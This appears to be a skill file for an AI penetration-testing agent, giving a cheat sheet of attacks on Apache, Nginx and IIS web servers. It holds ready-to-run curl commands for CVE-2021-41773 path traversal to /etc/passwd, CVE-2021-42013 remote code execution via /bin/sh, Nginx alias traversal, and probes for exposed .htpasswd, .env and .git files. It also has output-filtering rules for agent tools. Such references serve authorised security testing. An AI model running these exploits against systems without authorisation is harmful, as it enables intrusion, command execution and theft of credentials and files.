---
name: svc-web-server
description: Web server (Apache/Nginx/IIS) attack techniques — misconfigs, known CVEs, path traversal.
---

# Web Server Attack Reference

## Apache
### Critical CVEs
- **CVE-2021-41773** (Apache 2.4.49): Path traversal via `curl 'http://<t>/cgi-bin/.%2e/%2e%2e/etc/passwd'`
- **CVE-2021-42013** (Apache 2.4.49-50): RCE via `curl 'http://<t>/cgi-bin/.%%32%65/.%%32%65/bin/sh' -d 'echo;id'`
- **CVE-2019-0211** (Apache 2.4.17-2.4.38): Local privesc via scoreboard manipulation
- **CVE-2017-9798** (Optionsbleed): `curl -sI -X OPTIONS http://<t>/` — leaks memory

### Misconfigurations
```bash
# Server-status exposure
curl http://<t>/server-status
curl http://<t>/server-info

# .htaccess / .htpasswd readable
curl http://<t>/.htaccess
curl http://<t>/.htpasswd

# Directory listing
curl http://<t>/icons/
```

## Nginx
### CVEs
- **CVE-2017-7529** (Nginx <1.13.2): Integer overflow → info disclosure
- **CVE-2021-23017**: DNS resolver off-by-one heap write

### Misconfigurations
```bash
# Alias traversal (missing trailing slash)
curl http://<t>/static../etc/passwd

# stub_status exposure
curl http://<t>/nginx_status
curl http://<t>/status

# Off-by-slash
# If: location /folder { alias /var/www/; }
# Then: /folder../etc/passwd works
```

## IIS
### CVEs
- **CVE-2017-7269** (IIS 6.0): WebDAV buffer overflow → RCE
- **CVE-2021-31166** (HTTP.sys): Wormable RCE via malformed header

### Checks
```bash
# Short filename disclosure
curl http://<t>/~1/
# WebDAV methods
curl -X OPTIONS http://<t>/ -sI | grep -i allow
```

## General Web Server Checks
```bash
# Technology detection
whatweb http://<t> -a 3
curl -sI http://<t>   # Server, X-Powered-By headers

# Common backup files
for ext in bak old orig save swp ~; do curl -sI "http://<t>/index.php.$ext"; done

# Sensitive paths
for p in .git/HEAD .env .DS_Store wp-config.php.bak web.config robots.txt sitemap.xml; do
  curl -sI "http://<t>/$p"
done
```

## Output Rules
- Always use quiet/filtered output flags. Only show successful results.
- For gobuster/ffuf: use `-q -n --no-error` or `-mc` match codes to suppress noise.
- Redirect large output to files. Never paste >50 lines of raw tool output.
- Use `gobuster_parse` and `nuclei_parse` for auto-processing.
